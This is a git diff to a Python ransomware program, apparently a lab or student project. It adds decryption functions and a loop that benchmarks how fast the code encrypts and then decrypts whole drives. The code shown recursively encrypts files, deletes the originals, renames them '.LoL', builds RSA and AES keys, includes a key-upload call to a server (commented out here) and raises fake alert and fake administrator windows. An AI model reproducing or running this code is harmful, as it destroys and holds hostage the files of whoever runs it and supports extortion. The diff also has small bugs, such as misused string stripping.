@@ -94,6 +94,16 @@ class Encryptor:
             File.write(encryptedFile)
         os.remove(path)
 
+    @classmethod
+    def decEach(self, path):
+        originName=path.strip(".LoL")
+        with open(path, "rb") as File:
+            data=File.read()
+        decryptedFile=EncryptModule.decrypt(data)
+        with open(originName, "wb") as File:
+            File.write(decryptedFile)
+        os.remove(path)
+
     def encryptFile(self):
         try:
             for file in self._files:
@@ -102,7 +112,7 @@ class Encryptor:
                         return
                     if(os.path.getsize(file)>500000000):
                         if (len(ThreadPool)<MaxThread):
-                            th=Thread(target=Encryptor.encEach, args=(file,))
+                            th=Process(target=Encryptor.encEach, args=(file,))
                             ThreadPool.append(th)
                             th.start()
                         else:
@@ -110,6 +120,28 @@ class Encryptor:
                     else :
                         self.encEach(file)
                 
+        except Exception as e:
+            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
+            
+    def decryptFile(self):
+        try:
+            for file in self._files:
+                if(os.path.isfile(file)==True):
+                    if(file==sys.argv[0]):
+                        return
+                    extension=os.path.splitext(file)[-1]
+                    if(extension!='.LoL'):
+                        continue;
+                    
+                    if(os.path.getsize(file)>50000000):
+                        if (len(ThreadPool)<MaxThread):
+                            th=Process(target=Encryptor.decEach, args=(file,))
+                            ThreadPool.append(th)
+                            th.start()
+                        else:
+                            self.decEach(file)
+                    else :
+                        self.decEach(file)
         except Exception as e:
             print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
 
@@ -144,6 +176,21 @@ def recursiveEncrypt(basepath):
     for dir in dirs:
         recursiveEncrypt(dir)
 
+def recursiveDecrypt(basepath):
+    files=[]
+    dirs=[]
+    for entry in os.listdir(basepath):
+        absolutePath=os.path.join(basepath, entry)
+        if os.path.isfile(absolutePath):
+            files.append(absolutePath)
+        elif os.path.isdir(absolutePath):
+            dirs.append(absolutePath)
+
+    if (len(files)>0):
+        Encryptor(files).decryptFile()
+    for dir in dirs:
+        recursiveDecrypt(dir)
+
 #기타 함수
 def fakeAdmin():
     WINDOW=tkinter.Tk()
@@ -159,26 +206,47 @@ if __name__=='__main__':
     makeRSAKey()
     makeAESKey()
     encrypted_aes_key=encryptAES()
-    sendKeyToServer(encrypted_aes_key)
+    #sendKeyToServer(encrypted_aes_key)
     setEncryptModule()
     listUpTargetDir()
     t=Thread(target=fakeAlert)
     t.start()
+    enc_time=[]
+    dec_time=[]
+    total_time=[]
 
     if(IsAdmin==True):
         task_thread = threading.Thread(target=fakeAlert)
-        start=time.time()
-        for drive in PathList_DEBUG:
+        for i in range(10):
+            print("암호화 시작 %d/5"%(i+1))
             start=time.time()
-            recursiveEncrypt(drive)
+            for drive in PathList_DEBUG:
+                start=time.time()
+                recursiveEncrypt(drive)
+                end=time.time()
+                while (len(ThreadPool)!=0):
+                    th=ThreadPool.pop()
+                    th.join()
             end=time.time()
-            while (len(ThreadPool)!=0):
-                th=ThreadPool.pop()
-                th.join()
-        end=time.time()
-        print(end-start)
+            print("암호화 완료: %2.2f"  %(end-start))
+            enc_time.append(end-start)
+            start=time.time()
+            for drive in PathList_DEBUG:
+                start=time.time()
+                recursiveDecrypt(drive)
+                end=time.time()
+                while (len(ThreadPool)!=0):
+                    th=ThreadPool.pop()
+                    th.join()
+            end=time.time()
+            print("복호화 완료: %2.2f"  %(end-start))
+            dec_time.append(end-start)
+            total_time.append(dec_time[i]+enc_time[i])
     else:
         fakeAdmin()
     print("완료")
+    total_time.sort()
+    print(total_time)
+    print("mid %2.2f" %(total_time[4]))
     #os.system(afterFileName)
     #os.remove(fileName)
